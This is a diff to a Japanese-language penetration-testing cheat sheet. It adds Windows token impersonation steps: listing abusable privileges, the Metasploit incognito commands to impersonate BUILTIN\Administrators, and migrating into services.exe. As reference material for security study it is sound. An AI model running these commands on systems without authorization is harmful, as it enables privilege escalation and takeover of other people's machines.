@@ -1560,12 +1560,55 @@ Get-ExecutionPolicy -Scope CurrentUser
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 ```
 
+### Tokenの偽装(token impersonation)
+```
+全ての権限を表示:
+whoami /priv
+```
+- SeImpersonatePrivilege
+- SeAssignPrimaryPrivilege
+- SeTcbPrivilege
+- SeBackupPrivilege
+- SeRestorePrivilege
+- SeCreateTokenPrivilege
+- SeLoadDriverPrivilege
+- SeTakeOwnershipPrivilege
+- SeDebugPrivilege
+
+#### metasploit(token impersonation)
+```
+シークレットモードの読み込み:
+msf6 > load_incognito
+上記のコマンドで上手くいかない場合
+msf6 > use incognito
+
+偽装するトークン一覧を表示:
+msf6 > list_tokens -g
+トークンの偽装:
+msf6 > impersonate_token "BUILTIN\Administrators"
+トークン偽装後の権限確認:
+msf6 > getuid
+```
+
+高い特権トークンを持っていても、実際には特権ユーザーの権限を持っていない場合がある。  
+この場合、偽装トークン(なりすまし)ではなく、プライマリトークンを使用する必要がある。  
+選択するのに最も安全なプロセスはservices.exeプロセスである。
+```
+移行するプロセスを探すためにプロセス一覧の表示:
+(service.exeのプロセスを探すのが無難)
+msf6 > ps
+
+プロセスの移行:
+(service.exeのPIDなどを指定)
+msf6 > migrate <PID>
+```
+
 ### metasploit(local_exploit_suggester)
 exploitをせずに脆弱性をチェックするために使用するモジュール。  
 meterpreterでシェルを取得している場合、これを使うことで特権昇格に使えるexploitを簡単に探すことができる。
 
 ```
-use post/multi/recon/local_exploit_suggester
+msf6 > use post/multi/recon/local_exploit_suggester
 ```
 
 ### windows-exploit-suggester
